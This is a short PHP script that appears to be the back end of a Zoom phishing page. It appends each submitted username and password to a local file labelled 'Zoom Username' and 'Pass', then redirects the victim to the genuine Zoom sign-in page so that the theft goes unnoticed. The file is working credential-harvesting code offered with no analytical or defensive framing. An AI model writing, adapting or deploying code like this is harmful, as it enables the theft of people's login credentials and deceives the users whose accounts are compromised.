<?php
file_put_contents("usernames.txt", "Zoom Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://zoom.us/signin');
exit();
?>